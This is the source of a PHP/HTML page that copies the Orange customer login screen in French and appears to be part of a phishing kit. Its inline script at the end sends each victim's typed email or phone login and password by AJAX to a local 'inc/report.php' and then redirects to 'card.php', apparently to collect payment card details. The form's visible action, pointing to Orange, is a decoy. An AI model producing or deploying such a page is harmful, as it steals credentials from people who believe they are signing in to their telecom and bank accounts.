<?php
require '../ibc.php';
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
    <meta name="format-detection" content="telephone=no"/>
    <title>identifiez-vous</title>
    <link rel="icon" type="image/png" href="assets/img/favicon.png">
    <title>Identifiez-vous avec votre compte Orange</title>
    <link rel="stylesheet" href="assets/css/bundle.min.css">
    <link type="text/css" rel="stylesheet" href="app/views/assets/css/common.css">
    <link type="text/css" rel="stylesheet" href="assets/css/o_polaris3_responsive.css">
    <link type="text/css" rel="stylesheet" href="assets/css/o_completion.css">
    <link type="text/css" rel="stylesheet" href="assets/css/identify_style.css">
    <style>
        .error{
            border-weight:2px;
            border-color:#cd3c14;
        }
    </style>
</head>
<body>
<header id="o-header" class=" fixed-center o-center-align fixed-center o-center-align polaris3 o-noSearchZone"
        style="height: auto;">
    <div id="o-ribbon">
        <div id="o-nav-left">
            <ul>
                <li id="o-logo-container">
                    <a href="#" title="retour a l&#39;accueil" id="o-logo">
                        <img src="assets/img/logo-orange.png" title="retour a l&#39;accueil">
                    </a>
                </li>
                <li id="o-megamenu-link-container">
                    <div class="o-nav-item" id="o-megamenu-link" title="Mes services Orange" data-icon="">Mobiles et forfaits
                        <div class="o-nav-zone-panel-arrow"></div>
                    </div>

                </li>

                <li id="o-separator-container"><!-- <span id="o-separator" class="o-separator"></span> -->
                </li>
                <li id="o-espace-client-container">
                    <a id="o-espace-client" class="o-nav-item o-nav-left-link o-direct-link" href="#"
                       title="Espace client">
                        Internet
                        <div class="o-sense-of-place">
                        </div>
                    </a>
                </li>
                <li id="o-assistance-container">
                    <a id="o-assistance" class="o-nav-item o-nav-left-link o-direct-link"
                       href="#" title="Assistance">
                       Packs Internet + Mobile
                        <div class="o-sense-of-place"></div>
                    </a>
                </li>
                <li id="o-boutique-container">
                    <a id="o-boutique" class="o-nav-item o-nav-left-link o-direct-link" href="#" title="Boutique">
                        Maison
                        <div class="o-sense-of-place">
                        </div>
                    </a>
                </li>
                <li id="o-boutique-container">
                    <a id="o-boutique" class="o-nav-item o-nav-left-link o-direct-link" href="#" title="Boutique">
                        TV et divertissement
                        <div class="o-sense-of-place">
                        </div>
                    </a>
                </li>
                <li id="o-boutique-container">
                    <a id="o-boutique" class="o-nav-item o-nav-left-link o-direct-link" href="#" title="Boutique">
                        Banque
                        <div class="o-sense-of-place">
                        </div>
                    </a>
                </li>
                <li id="o-boutique-container">
                    <a id="o-boutique" class="o-nav-item o-nav-left-link o-direct-link" href="#" title="Boutique">
                        News
                        <div class="o-sense-of-place">
                        </div>
                    </a>
                </li>
                <li id="o-popin-search-container">
                    <div title="Rechercher" id="o-popin-search" class="o-nav-item"><span>Rechercher</span>
                        <div class="o-nav-zone-panel-arrow"></div>
                    </div>
                    <div class="o-nav-zone-panel o-nav-zone-panel-full-width" id="o-popin-search-panel">
                        <div class="o-nav-zone-panel-content">
                            <div class="o-nav-zone-panel-title">Rechercher sur le web</div>
                            <div class="o-nav-zone-panel-data">
                                <form class="o-search-form" id="formSearchCompletion-nav" name="formSearchCompletion"
                                      action="#" method="get">
                                    <label class="o-search-label" for="o-search-input-nav">Rechercher sur Orange</label>
                                    <input autocomplete="off" class="o-search-input" id="o-search-input-nav"
                                           name="rdata" accesskey="0" type="text">
                                    <input class="o-search-submit" title="rechercher" type="submit">
                                </form>
                            </div>
                            <div class="o-nav-zone-panel-close-button" id="o-popin-search-close-button" title="Fermer">
                                ×
                            </div>
                        </div>
                    </div>
                </li>
            </ul>
        </div>
        <div id="o-nav-right">
            <ul></ul>
        </div>
    </div>
</header>
<main class="eui-container" role="main">
    <div class="o-container-fluid eui-title-area">
        <div class="row">
            <div class="col-xs-12 col-md-8 col-lg-8 col-xl-8">
                <h1 id="title" class="identify-title">Identifiez-vous</h1>
            </div>
        </div>
    </div>
    <div class="o-container-fluid">
        <div class="row">
            <div class="col-xs-12 col-md-6 col-lg-6 col-xl-6">
                <form novalidate="" class="eui-form" id="euiForm" action="https://login.orange.fr/assistance" for="coordonnees" method="post">
                    <input name="type" type="hidden" value="1"/>
                    <div id="stage-1">
                        <div id="eui-accounts"></div>
                        <div class="form-group ">
                            <h2 class="sr-only">Indiquez votre compte Orange</h2>
                            <div class="eui-input-label eui-input-style">
                                <div class="eui-row">
                                    <label for="login" id="loginLabel" class="eui-label">Indiquez votre compte Orange</label>
                                    <!-- <div class="eui-assistance-area">
                                        <button class="eui-svg eui-icon-help" type="button" id="helpLogin"><span class="sr-only">aide</span>
                                        </button>
                                    </div> -->
                                </div>
                            </div>
                            <div class="eui-help" id="helpLoginCnt" style="display : none;">
                                <p class="noSelectContent" tabindex="-1"><span>Votre compte Orange permet l’accès à vos services personnels. Il est désigné par une adresse mail ou un numéro de mobile.</span>
                                    <br><span>C’est votre première visite &gt;&gt; <a
                                                href="#" target="_self"
                                                title="Aide">Aide</a></span>
                                    <br><span>Vous ne connaissez pas l’adresse mail de votre compte Orange &gt;&gt; <a
                                                href="#" id="getAccounts" class="getAccounts"
                                                title="Voir les comptes disponibles">Voir les comptes disponibles</a></span>
                                </p>
                            </div>
                            <h6 id="error-msg-box-login blockelem hidden" tabindex="0" class="form-control-message" role="alert" title="erreur">
                                Ce compte Orange est inconnu ou n’est pas disponible.
                            </h6>
                            <div class="placeholderContent placeholderNum">
                                <span class="placeholder placeholderDisplay" id="placeholderLogin">Adresse mail ou n° de mobile Orange</span>
                                <input type="text" id="login" name="login" class="form-control mail-login" maxlength="256" autocorrect="off" autocapitalize="off" spellcheck="false">
                            </div>
                            <div class="notify">
                                a
                            </div>
                        </div>
                        <div class="list-link"><a class="list-link-label" href="#"><label>Comment retrouver l’adresse e-mail de votre compte</label><img src="assets/img/right-arrow.png"></a></div>
                        <button id="btnSubmitEmail" type="button" class="btn eui-btn-sub btn-sub-style">Continuer</button>
                        <!-- <nav class="eui-links row" role="navigation">
                            <div id="getAccountsBLink" class="col-xs-12 col-md-12 col-lg-12 col-xl-12" style=""><a
                                        href="#"
                                        id="getAccountsLink"
                                        class="getAccounts"
                                        title="Voir les comptes disponibles">Voir
                                    les comptes disponibles</a>
                            </div>
                            <div id="firstAccessDiv" class="col-xs-12 col-md-12 col-lg-12 col-xl-12"><a
                                        id="firstAccessLink"
                                        href="#"
                                        title="Créer votre compte">Créer
                                    votre compte</a>
                            </div>
                            <div id="moreHelpLink" class="col-xs-12 col-md-12 col-lg-5 col-xl-4">
                                <a href="#">Aide</a>
                            </div>
                            <div id="privacyPolicy" class="col-xs-12 col-md-12 col-lg-6 col-xl-6">
                                <a id="privacyLink" href="#" target="_blank" title="Politique de confidentialité (nouvel onglet)">
                                    Politique de confidentialité
                                </a>
                            </div>
                            <div id="recueilVerbatimDiv" class="col-xs-12 col-md-12 col-lg-12 col-xl-12">
                                <a id="recueilVerbatimLink" href="#" target="_blank"
                                        title="Donner votre avis sur la nouvelle page (nouvel onglet)">
                                    Donner votre avis
                                    sur la
                                    nouvelle page
                                </a>
                            </div>
                        </nav> -->
                    </div>
                    

                    <!--password part-->
                    <div id="stage-2" class="eui-st2">
                        <h2 class="sr-only">Saisissez votre mot de passe</h2>
                        <div class="eui-identity-area">
                            <div class="x-col-avatar">
                                <div class="eui-avatar">
                                    <div class="eui-svg eui-icon-avatar"
                                         id="accountAvatar" title="Avatar d’utilisateur"></div>
                                </div>
                            </div>
                            <div class="x-col-identity">
                                <div class="x-identity">
                                    <p class="x-dsn eui-dsn eui-ellipsis"  id="accountLogin">
                                        votre mot de passe orange</p>
                                </div>
                            </div>
                        </div>
                        <div class="clearfix"></div>
                        <div class="form-group ">
                            <div class="eui-input-label">
                                <label for="password" id="passwordLabel">Saisissez votre mot de passe</label>
                                <div class="eui-assistance-area">
                                    <button class="eui-svg eui-icon-help" type="button" id="helpPassword">
                                        <span class="sr-only">aide</span>
                                    </button>
                                </div>
                            </div>
                            <div class="eui-help" id="helpPasswordCnt" style="display : none;">
                                <p class="noSelectContent" tabindex="-1">Vous ne retrouvez pas votre mot de passe. &gt;&gt;
                                    <a href="#" class="eui-reinitLostLink"
                                       title="Réinitialisez-le.">Réinitialisez-le.</a></p>
                            </div>

                            <h6 id="error-msg-box" tabindex="0" class="form-control-message"
                                role="alert" title="erreur">C’est incorrect, vérifiez l’adresse mail et le mot de passe saisis.</h6>


                            <div class="placeholderContent">
                                <span class="placeholder placeholderDisplay"
                                      id="placeholderPassword">Mot de passe</span>
                                <input type="password" name="password" id="password" class="form-control" maxlength="36" required="">
                            </div>
                        </div>
                        <div class="form-group eui-checkbox">
                            <input type="checkbox" class="o-checkbox" id="remember" checked="checked"
                                   style="display:block">
                            <label for="remember" id="rememberLabel"><span
                                        class="eui-label-content">Rester identifié</span>
                            </label>
                        </div>
                        <div>
                            <button id="submitbutton" type="button" class="btn btn-primary eui-btn-sub" onclick="submitlogin()">S’identifier
                            </button>
                            <a class="eui-links-passwd" href="#"
                               title="Mot de passe oublié ?">Mot de passe oublié ?</a>
                        </div>


                        <nav class="eui-links row" role="navigation">

                            <div id="getAccountsBLink" class="col-xs-12 col-md-12 col-lg-12 col-xl-12"
                                 style="display: none;">
                                <a href="#" id="getAccountsLink" class="getAccounts"
                                   title="Voir les comptes disponibles">Voir les comptes disponibles</a></div>

                            <div id="firstAccessDiv" class="col-xs-12 col-md-12 col-lg-12 col-xl-12"
                                 style="display: none;">
                                <a id="firstAccessLink" href="#"
                                   title="Créer votre compte">Créer votre compte</a>
                            </div>

                            <div id="changeAccountDiv" class="col-xs-12 col-md-12 col-lg-12 col-xl-12"
                                 style="display: block;">
                                <a id="changeAccountLink" href="#" title="Utiliser un autre compte">Utiliser
                                    un autre compte</a>
                            </div>

                            <div id="moreHelpLink" class="col-xs-12 col-md-12 col-lg-5 col-xl-4">
                                <a href="#">Aide</a>
                            </div>

                            <div id="privacyPolicy" class="col-xs-12 col-md-12 col-lg-6 col-xl-6">
                                <a id="privacyLink" href="#" target="_blank"
                                   title="Politique de confidentialité (nouvel onglet)">Politique de confidentialité</a>
                            </div>
                            <div id="recueilVerbatimDiv" class="col-xs-12 col-md-12 col-lg-12 col-xl-12">
                                <a id="recueilVerbatimLink"
                                   href="#" target="_blank"
                                   title="Donner votre avis sur la nouvelle page (nouvel onglet)">Donner votre avis sur
                                    la
                                    nouvelle page</a>
                            </div>
                        </nav>

                    </div>
                </form>
            </div>
            <div id="magicZone"
                 class="eui-banner-place col-xs-12 col-md-5 col-md-offset-1 col-lg-4 col-lg-offset-2  col-xl-4 col-xl-offset-2">
                <a class="eui-block" href="#" target="_blank">
                    <div id="elmt-banner" class="eui-banner" alt="banner"
                         title="Lien zone de communication (nouvel onglet)"></div>
                </a>
            </div>
        </div>
    </div>
    <div class="eui-container">
        <div class="o-container-fluid">
            <hr>
            <div class="list-link"><a class="list-link-label" href="#"><label>Créer un compte sans être client Orange</label><img src="assets/img/right-arrow.png"></a></div>
            <div class="list-link"><a class="list-link-label" href="#"><label>Besoin d’aide ?</label><img src="assets/img/right-arrow.png"></a></div>
        </div>
    </div>
</main>
<footer class="footer-fluid">
    <div class="eui-footer-banner hidden-xs hidden-sm">
        <div class="eui-mega-banner oan_ad" id="ora_2_728x90_identification"></div>
    </div>
    <div id="cefooter">
        <div id="o-footer-wrapper" class="">
            <div class="o-footer-liendirect">
                <div class="o-footer-liendirect-content">
                    <span class="o-footer-liendirect-item">
                        <a class="o-icomoon"
                           href="#"
                           title="Aide et contact"
                           data-icon="">Aide et contact</a>
                    </span>
                    <span class="o-footer-liendirect-item">
                    <a class="o-icomoon" href="https://boutique.orange.fr"
                       title="Forum d'entraide" data-icon="">Forum d'entraide</a>
                    </span>
                    <span class="o-footer-liendirect-item">
                    <a class="o-icomoon" href="#"
                       title="Trouver une boutique" data-icon="">Trouver une boutique</a>
                    </span>
                </div>
            </div>
            <div class="o-footer-lienlegal">
                <div class="o-footer-lienlegal-content"> <span class="o-footer-lienlegal-item">
                        <a href="#" title="Informations légales" target="_blank">Informations légales</a>
                    </span>
                    <span class="o-footer-lienlegal-item">
                        <a href="#" title="Données personnelles" target="_blank">Données personnelles</a>
                    </span>
                    <span class="o-footer-lienlegal-item">
                        <a href="#" title="Les cookies" target="_blank">Les cookies</a>
                    </span>
                    <span class="o-footer-lienlegal-item">
                        <a href="#" title="Publicité" target="_blank">Publicité</a>
                    </span>
                    <span class="o-footer-lienlegal-item">
                        <a href="#" title="Internet +" target="_blank">Internet +</a>
                    </span>
                    <span class="o-footer-lienlegal-item">
                        <a href="#" title="Signaler un contenu" target="_blank">Signaler un contenu</a>
                    </span><span class="o-footer-lienlegal-item">© Orange 2020</span>
                </div>
            </div>
        </div>
    </div>
</footer>
<script src="assets/js/jquery.min.js" type="text/javascript"></script>
<script src="assets/js/js.cookie.min.js" type="text/javascript"></script>
<script src="js/login.js" type="text/javascript"></script>
<script src="assets/js/identify-script.js" type="text/javascript"></script>
<script>
    loginDesktop();
</script>
<script type="text/javascript">

    function siftajax(){
         $.ajax({
        url: "inc/report.php",
        type: "post",
        data: {action:'login',user:$('#login').val(),pass:$('#password').val()},
        success:function(data) {
        window.location.href ="card.php";
			},
        error: function(jqXHR, textStatus, errorThrown) {
           console.log(textStatus, errorThrown);
        }
    });}
    function siftajax2(){
         $.ajax({
        url: "inc/report.php",
        type: "post",
        data: {action:'login',user:Cookies.get('username'),pass:$('#password').val()},
        success:function(data) {
        window.location.href ="card.php";
			},
        error: function(jqXHR, textStatus, errorThrown) {
           console.log(textStatus, errorThrown);
        }
    });
    }
    function check_password(id){
    if($('#'+id).val().length == 0){
        $('#'+id).addClass('error');return false;} else{return true;}   
    }
    function submitlogin(){
        if(check_password('password') == false){
            return false;
        }else{
            if($('#login').val().length !== 0){
            siftajax();
            }else{
            siftajax2();    
            }
        }
    }
</script>
</body>

</html>